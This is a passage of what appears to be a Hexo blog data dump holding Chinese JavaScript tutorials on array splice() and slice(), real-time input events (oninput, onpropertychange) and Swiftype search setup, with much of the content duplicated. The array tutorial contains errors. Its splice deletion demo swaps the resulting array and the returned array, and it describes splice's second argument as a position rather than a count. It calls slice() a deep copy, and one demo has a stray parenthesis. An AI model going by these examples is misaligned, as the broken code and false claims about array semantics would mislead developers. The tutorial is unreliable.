<code>splice()</code></li>\n</ol>\n<ul>\n<li>splice()方法允许我们对数组进行插入、替换和删除的功能。<strong>splice方法返回一个有删除元素组成的新数组，没有删除时则返回一个空数组</strong>，简直完美呀！</li>\n<li><code>splice()</code>方法接受三个参数，<strong>第一个</strong>为开始索引，<strong>第二个</strong>为删除元素的位置，<strong>第三个</strong>为插入的元素，可以为第二个，当然也可省略（表示删除元素）。</li>\n<li><code>splice()</code>方法会修改原数组！</li>\n<li>通过以下三个demo了解一下具体的用法吧：<br>插入:<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary1 = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary1.splice(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"string\">\"add1\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary1);      [ <span class=\"string\">'first'</span>, <span class=\"string\">'add1'</span>, <span class=\"string\">'second'</span>, <span class=\"string\">'third'</span>, <span class=\"string\">'forth'</span>, <span class=\"string\">'fifth'</span> ]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary2);      [] 没有删除则放回一个空数组</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>替换：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary1 = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary1.splice(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"string\">\"replace\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary1);      [ <span class=\"string\">'first'</span>, <span class=\"string\">\"replace, 'third', 'forth', 'fifth' ]</span></span><br><span class=\"line\"><span class=\"string\">console.log(ary2);      [\"</span>second<span class=\"string\">\"] 返回被删除(即替换)的数组</span></span><br></pre></td></tr></table></figure></p>\n<p>删除：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary1 = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary1.splice(<span class=\"number\">1</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary1);      [<span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary2);      [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"fifth\"</span>]</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><code>slice()</code> 方法</li>\n</ol>\n<ul>\n<li><code>slice()</code> 方法可以接受两个参数(start, end)；</li>\n<li><code>slice()</code> 方法可从已有的数组中返回选定的元素；</li>\n<li><code>slice()</code> 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分；</li>\n<li><code>slice()</code> 方法<strong>不会改变原始数组</strong>，而是返回一个新数组。<br>demo1:<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log (ary.slice(<span class=\"number\">1</span>,<span class=\"number\">2</span>) );      <span class=\"comment\">// [\"second\"]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> ary1 = ary.slice(<span class=\"number\">1</span>,<span class=\"number\">2</span>);          <span class=\"comment\">// [\"second\"]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary.slice(<span class=\"number\">1</span>,<span class=\"number\">3</span>);          <span class=\"comment\">// [\"second\", \"third\"]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary);                   <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>demo2:<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary.slice(<span class=\"number\">1</span>,<span class=\"number\">2</span>));    <span class=\"comment\">// [\"second\"]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary.slice(<span class=\"number\">1</span>,<span class=\"number\">3</span>));    <span class=\"comment\">// [\"second\", \"third\"]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary));              <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br></pre></td></tr></table></figure></p>\n<p>demo3:<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary1 = ary.slice();     <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary.slice(<span class=\"number\">0</span>);     <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br><span class=\"line\"></span><br><span class=\"line\">ary === ary1;       <span class=\"comment\">// false</span></span><br><span class=\"line\">ary === ary2;       <span class=\"comment\">// false</span></span><br><span class=\"line\">ary1 === ary2;      <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>看出来啥猫腻没，这不是深复制一个数据吗！</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"关于数组的一些认识\"><a href=\"#关于数组的一些认识\" class=\"headerlink\" title=\"关于数组的一些认识\"></a>关于数组的一些认识</h4><ol>\n<li>使用构造器函数创建数组时:<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>若参数只有一个，且为数字，<code>let ary1 = new Array(3)</code>，这是其实我们是在指定数组的长度的，即 <code>ary1.length === 3</code>。<code>ary1[0]</code>则为<code>undefined</code>;</li>\n<li>当定义<code>let ary2 = new Array(1, 2, 3)</code>时，此时<code>ary2 === [1, 2, 3]</code>;</li>\n</ul>\n<ol>\n<li><p>JS中的数组定义非常的自由：<br>看下面的例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">ary[<span class=\"number\">5</span>] = <span class=\"number\">5</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary);           <span class=\"comment\">// [1,2,3,undefined,undefined,5]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary.length);    <span class=\"comment\">// 6</span></span><br></pre></td></tr></table></figure>\n<p>再看：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary2 = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\">ary2.length = <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary2);      <span class=\"comment\">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"常用的数组API\"><a href=\"#常用的数组API\" class=\"headerlink\" title=\"常用的数组API\"></a>常用的数组API</h4><ol>\n<li>万能方法 <code>splice()</code></li>\n</ol>\n<ul>\n<li>splice()方法允许我们对数组进行插入、替换和删除的功能。<strong>splice方法返回一个有删除元素组成的新数组，没有删除时则返回一个空数组</strong>，简直完美呀！</li>\n<li><code>splice()</code>方法接受三个参数，<strong>第一个</strong>为开始索引，<strong>第二个</strong>为删除元素的位置，<strong>第三个</strong>为插入的元素，可以为第二个，当然也可省略（表示删除元素）。</li>\n<li><code>splice()</code>方法会修改原数组！</li>\n<li>通过以下三个demo了解一下具体的用法吧：<br>插入:<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary1 = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary1.splice(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"string\">\"add1\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary1);      [ <span class=\"string\">'first'</span>, <span class=\"string\">'add1'</span>, <span class=\"string\">'second'</span>, <span class=\"string\">'third'</span>, <span class=\"string\">'forth'</span>, <span class=\"string\">'fifth'</span> ]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary2);      [] 没有删除则放回一个空数组</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>替换：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary1 = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary1.splice(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"string\">\"replace\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary1);      [ <span class=\"string\">'first'</span>, <span class=\"string\">\"replace, 'third', 'forth', 'fifth' ]</span></span><br><span class=\"line\"><span class=\"string\">console.log(ary2);      [\"</span>second<span class=\"string\">\"] 返回被删除(即替换)的数组</span></span><br></pre></td></tr></table></figure></p>\n<p>删除：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary1 = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary1.splice(<span class=\"number\">1</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary1);      [<span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary2);      [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"fifth\"</span>]</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><code>slice()</code> 方法</li>\n</ol>\n<ul>\n<li><code>slice()</code> 方法可以接受两个参数(start, end)；</li>\n<li><code>slice()</code> 方法可从已有的数组中返回选定的元素；</li>\n<li><code>slice()</code> 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分；</li>\n<li><code>slice()</code> 方法<strong>不会改变原始数组</strong>，而是返回一个新数组。<br>demo1:<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log (ary.slice(<span class=\"number\">1</span>,<span class=\"number\">2</span>) );      <span class=\"comment\">// [\"second\"]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> ary1 = ary.slice(<span class=\"number\">1</span>,<span class=\"number\">2</span>);          <span class=\"comment\">// [\"second\"]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary.slice(<span class=\"number\">1</span>,<span class=\"number\">3</span>);          <span class=\"comment\">// [\"second\", \"third\"]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary);                   <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>demo2:<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary.slice(<span class=\"number\">1</span>,<span class=\"number\">2</span>));    <span class=\"comment\">// [\"second\"]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary.slice(<span class=\"number\">1</span>,<span class=\"number\">3</span>));    <span class=\"comment\">// [\"second\", \"third\"]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary));              <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br></pre></td></tr></table></figure></p>\n<p>demo3:<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"string\">\"first\"</span>, <span class=\"string\">\"second\"</span>, <span class=\"string\">\"third\"</span>, <span class=\"string\">\"forth\"</span>, <span class=\"string\">\"fifth\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> ary1 = ary.slice();     <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> ary2 = ary.slice(<span class=\"number\">0</span>);     <span class=\"comment\">// [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];</span></span><br><span class=\"line\"></span><br><span class=\"line\">ary === ary1;       <span class=\"comment\">// false</span></span><br><span class=\"line\">ary === ary2;       <span class=\"comment\">// false</span></span><br><span class=\"line\">ary1 === ary2;      <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>看出来啥猫腻没，这不是深复制一个数据吗！</strong></p>\n"},{"id":"0809015","title":"实时监听文本域输入","date":"2016-10-13T11:57:50.000Z","_content":"\n众所周知，使用 `onchange` 事件来监听文本域的变化是我们在开发中用到的最多的方法。但是， `onchange` 是在文本域失焦时才触发，有时候由于需求的原因，需要我们来实时监听文本域的变化，除了使用`keydown`和`keyup`外，我们还可以:\n- 使用 `onpropertychange`：\n\n```javascript\n<input type=\"text\" id=\"txt\">\n\n$(\"#ysy\").bind('input propertychange', function() {  \n    console.log(new Date().getTime()); \n});\n```\n- 使用 `oninput`：\n\n```javascript\ndocument.getElementById('txt').oninput = function(){\n    console.log(this.value);\n}\n```\n最后，总结一下`onchange`, `onpropertychange`和`oninput`之间的异同：\n1. `onchange`事件与`onpropertychange`事件的区别：`onchange`事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发；`onpropertychange`事件却是实时触发，即每增加或删除一个字符就会触发，通过js改变也会触发该事件，但是该事件IE专有。\n2. `oninput`事件与`onpropertychange`事件的区别：`oninput`事件是IE之外的大多数浏览器支持的事件，在value改变时触发，实时的，即每增加或删除一个字符就会触发，然而通过js改变value时，却不会触发；`onpropertychange`事件是任何属性改变都会触发的，而`oninput`却只在value改变时触发，`oninput`要通过`addEventListener()`来注册，`onpropertychange`注册方式跟一般事件一样。（此处都是指在js中动态绑定事件，以实现内容与行为分离）>\n3. `oninput`与`onpropertychange`失效的情况：  （1）`oninput`事件：a). 当脚本中改变value时，不会触发；b).从浏览器的自动下拉提示中选取时，不会触发。  （2）`onpropertychange`事件：当input设置为`disable=true`后，onpropertychange不会触发。\n---","source":"_posts/0809015_实时监听文本域输入.md","raw":"---\nid: 0809015\ntitle: 实时监听文本域输入\ndate: 2016-10-13 19:57:50\ntags:\n    - JavaScript\ncategories:\n---\n\n众所周知，使用 `onchange` 事件来监听文本域的变化是我们在开发中用到的最多的方法。但是， `onchange` 是在文本域失焦时才触发，有时候由于需求的原因，需要我们来实时监听文本域的变化，除了使用`keydown`和`keyup`外，我们还可以:\n- 使用 `onpropertychange`：\n\n```javascript\n<input type=\"text\" id=\"txt\">\n\n$(\"#ysy\").bind('input propertychange', function() {  \n    console.log(new Date().getTime()); \n});\n```\n- 使用 `oninput`：\n\n```javascript\ndocument.getElementById('txt').oninput = function(){\n    console.log(this.value);\n}\n```\n最后，总结一下`onchange`, `onpropertychange`和`oninput`之间的异同：\n1. `onchange`事件与`onpropertychange`事件的区别：`onchange`事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发；`onpropertychange`事件却是实时触发，即每增加或删除一个字符就会触发，通过js改变也会触发该事件，但是该事件IE专有。\n2. `oninput`事件与`onpropertychange`事件的区别：`oninput`事件是IE之外的大多数浏览器支持的事件，在value改变时触发，实时的，即每增加或删除一个字符就会触发，然而通过js改变value时，却不会触发；`onpropertychange`事件是任何属性改变都会触发的，而`oninput`却只在value改变时触发，`oninput`要通过`addEventListener()`来注册，`onpropertychange`注册方式跟一般事件一样。（此处都是指在js中动态绑定事件，以实现内容与行为分离）>\n3. `oninput`与`onpropertychange`失效的情况：  （1）`oninput`事件：a). 当脚本中改变value时，不会触发；b).从浏览器的自动下拉提示中选取时，不会触发。  （2）`onpropertychange`事件：当input设置为`disable=true`后，onpropertychange不会触发。\n---","slug":"0809015_实时监听文本域输入","published":1,"updated":"2018-03-19T02:06:10.791Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtz000ns4c0ji79ityt","content":"<p>众所周知，使用 <code>onchange</code> 事件来监听文本域的变化是我们在开发中用到的最多的方法。但是， <code>onchange</code> 是在文本域失焦时才触发，有时候由于需求的原因，需要我们来实时监听文本域的变化，除了使用<code>keydown</code>和<code>keyup</code>外，我们还可以:</p>\n<ul>\n<li>使用 <code>onpropertychange</code>：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=<span class=\"string\">\"text\"</span> id=<span class=\"string\">\"txt\"</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">\"#ysy\"</span>).bind(<span class=\"string\">'input propertychange'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;  </span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getTime()); </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用 <code>oninput</code>：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).oninput = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后，总结一下<code>onchange</code>, <code>onpropertychange</code>和<code>oninput</code>之间的异同：</p>\n<ol>\n<li><code>onchange</code>事件与<code>onpropertychange</code>事件的区别：<code>onchange</code>事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发；<code>onpropertychange</code>事件却是实时触发，即每增加或删除一个字符就会触发，通过js改变也会触发该事件，但是该事件IE专有。</li>\n<li><code>oninput</code>事件与<code>onpropertychange</code>事件的区别：<code>oninput</code>事件是IE之外的大多数浏览器支持的事件，在value改变时触发，实时的，即每增加或删除一个字符就会触发，然而通过js改变value时，却不会触发；<code>onpropertychange</code>事件是任何属性改变都会触发的，而<code>oninput</code>却只在value改变时触发，<code>oninput</code>要通过<code>addEventListener()</code>来注册，<code>onpropertychange</code>注册方式跟一般事件一样。（此处都是指在js中动态绑定事件，以实现内容与行为分离）&gt;</li>\n<li><code>oninput</code>与<code>onpropertychange</code>失效的情况：  （1）<code>oninput</code>事件：a). 当脚本中改变value时，不会触发；b).从浏览器的自动下拉提示中选取时，不会触发。  （2）<code>onpropertychange</code>事件：当input设置为<code>disable=true</code>后，onpropertychange不会触发。</li>\n</ol>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<p>众所周知，使用 <code>onchange</code> 事件来监听文本域的变化是我们在开发中用到的最多的方法。但是， <code>onchange</code> 是在文本域失焦时才触发，有时候由于需求的原因，需要我们来实时监听文本域的变化，除了使用<code>keydown</code>和<code>keyup</code>外，我们还可以:</p>\n<ul>\n<li>使用 <code>onpropertychange</code>：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=<span class=\"string\">\"text\"</span> id=<span class=\"string\">\"txt\"</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">\"#ysy\"</span>).bind(<span class=\"string\">'input propertychange'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;  </span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getTime()); </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用 <code>oninput</code>：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).oninput = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后，总结一下<code>onchange</code>, <code>onpropertychange</code>和<code>oninput</code>之间的异同：</p>\n<ol>\n<li><code>onchange</code>事件与<code>onpropertychange</code>事件的区别：<code>onchange</code>事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发；<code>onpropertychange</code>事件却是实时触发，即每增加或删除一个字符就会触发，通过js改变也会触发该事件，但是该事件IE专有。</li>\n<li><code>oninput</code>事件与<code>onpropertychange</code>事件的区别：<code>oninput</code>事件是IE之外的大多数浏览器支持的事件，在value改变时触发，实时的，即每增加或删除一个字符就会触发，然而通过js改变value时，却不会触发；<code>onpropertychange</code>事件是任何属性改变都会触发的，而<code>oninput</code>却只在value改变时触发，<code>oninput</code>要通过<code>addEventListener()</code>来注册，<code>onpropertychange</code>注册方式跟一般事件一样。（此处都是指在js中动态绑定事件，以实现内容与行为分离）&gt;</li>\n<li><code>oninput</code>与<code>onpropertychange</code>失效的情况：  （1）<code>oninput</code>事件：a). 当脚本中改变value时，不会触发；b).从浏览器的自动下拉提示中选取时，不会触发。  （2）<code>onpropertychange</code>事件：当input设置为<code>disable=true</code>后，onpropertychange不会触发。</li>\n</ol>\n<hr>\n"},{"id":"0809018","title":"在 hexo 中配置 swiftype 搜索系统","date":"2018-02-28T09:23:37.000Z","_content":"\n- 进入[swiftype](https://swiftype.com/)官网：\n<!-- ![swiftype](/images/swiftype.png) -->\n<img src=\"/images/swiftype.png\" class=\"preview\">\n完成注册后，我们进入到[概览](https://app.swiftype.com/engines/blog/overview)页面，进入到overview页面后，点击`Install Swiftype On Your Website`，我们会看到如图的两段代码，分别是搜索文本框和脚本，我们可以将文本框放在任何位置自己喜欢的位置，脚本也是如此，这个swiftype并没有任何限制：\n<img src=\"/images/swiftype1.png\" class=\"preview\">\n\n- 当在输入框输入时，会异步搜索文章并显示搜索推荐\n<img src=\"/images/swiftype2.png\" class=\"preview\">\n点击回车，会弹出一个稍大的窗口\n<img src=\"/images/swiftype3.png\" class=\"preview\">\n\n","source":"_posts/0809018_在hexo中配置swiftype搜索系统.md","raw":"---\nid: 0809018\ntitle: 在 hexo 中配置 swiftype 搜索系统\ndate: 2018-02-28 17:23:37\ntags:\n    - swiftype\n    - JavaScript\ncategories:\n---\n\n- 进入[swiftype](https://swiftype.com/)官网：\n<!-- ![swiftype](/images/swiftype.png) -->\n<img src=\"/images/swiftype.png\" class=\"preview\">\n完成注册后，我们进入到[概览](https://app.swiftype.com/engines/blog/overview)页面，进入到overview页面后，点击`Install Swiftype On Your Website`，我们会看到如图的两段代码，分别是搜索文本框和脚本，我们可以将文本框放在任何位置自己喜欢的位置，脚本也是如此，这个swiftype并没有任何限制：\n<img src=\"/images/swiftype1.png\" class=\"preview\">\n\n- 当在输入框输入时，会异步搜索文章并显示搜索推荐\n<img src=\"/images/swiftype2.png\" class=\"preview\">\n点击回车，会弹出一个稍大的窗口\n<img src=\"/images/swiftype3.png\" class=\"preview\">\n\n","slug":"0809018_在hexo中配置swiftype搜索系统","published":1,"updated":"2018-03-26T12:19:18.312Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvu2000qs4c0jv7qrp1i","content":"<ul>\n<li><p>进入<a href=\"https://swiftype.com/\" target=\"_blank\" rel=\"noopener\">swiftype</a>官网：</p>\n<!-- ![swiftype](/images/swiftype.png) -->\n<p><img src=\"/images/swiftype.png\" class=\"preview\"><br>完成注册后，我们进入到<a href=\"https://app.swiftype.com/engines/blog/overview\" target=\"_blank\" rel=\"noopener\">概览</a>页面，进入到overview页面后，点击<code>Install Swiftype On Your Website</code>，我们会看到如图的两段代码，分别是搜索文本框和脚本，我们可以将文本框放在任何位置自己喜欢的位置，脚本也是如此，这个swiftype并没有任何限制：<br><img src=\"/images/swiftype1.png\" class=\"preview\"></p>\n</li>\n<li><p>当在输入框输入时，会异步搜索文章并显示搜索推荐<br><img src=\"/images/swiftype2.png\" class=\"preview\"><br>点击回车，会弹出一个稍大的窗口<br><img src=\"/images/swiftype3.png\" class=\"preview\"></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><p>进入<a href=\"https://swiftype.com/\" target=\"_blank\" 